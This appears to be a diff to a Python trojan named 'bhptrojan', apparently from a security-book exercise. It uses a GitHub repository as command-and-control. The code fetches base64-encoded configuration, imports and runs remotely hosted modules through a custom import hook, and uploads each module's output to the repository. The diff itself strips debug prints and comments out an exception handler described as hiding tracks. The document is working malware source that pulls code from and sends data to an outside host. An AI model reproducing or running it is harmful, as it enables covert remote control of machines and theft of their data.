@@ -18,7 +18,6 @@ def github_connect():                                                           
     return sess.repository(user, 'bhptrojan')
 
 def getContent(dirname, module_name, repo):                                         #Gather modules from config
-    print(repo.file_contents(f'{dirname}/{module_name}').content)
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
@@ -32,24 +31,21 @@ class Trojan:
         config_json = getContent('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
-            print(task['module'])
             if task['module'] not in sys.modules:
-                print(task['module'])
                 exec("import %s" % task['module'])
             return config
         
     def moduleRun(self, module):
-        try:                                                    #In the event of a keyerror due to incompatible file paths. Bypass the module to prevent modification and thus hiding tracks in fingerprints
-            result = sys.modules[module].run()
-            self.store_module_result(result)
-        except: 
-            pass
+        #try:                                                    #In the event of a keyerror due to incompatible file paths. Bypass the module to prevent modification and thus hiding tracks in fingerprints
+        result = sys.modules[module].run()
+        self.store_module_result(result)
+        #except: 
+        #    pass
         
     def store_module_result(self, data):
         message = str(datetime.now())                                               #Set message equal to current time
         if ':' in message:                                                          #Check if : in message
             message = message.replace(":", "-")                                     #Bypass to ensure files store properly in windows or linux
-            print(message)
         remote_path = f'data/{self.id}/{message}.data'                              #Set file data path
         bindata = bytes('%r' % data, 'utf-8')
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))      #Create your file with bit based data
@@ -86,5 +82,4 @@ class GitImport:
 if __name__ == '__main__':
     sys.meta_path.append(GitImport())
     trojan = Trojan('abc')
-    print(trojan)
     trojan.run()
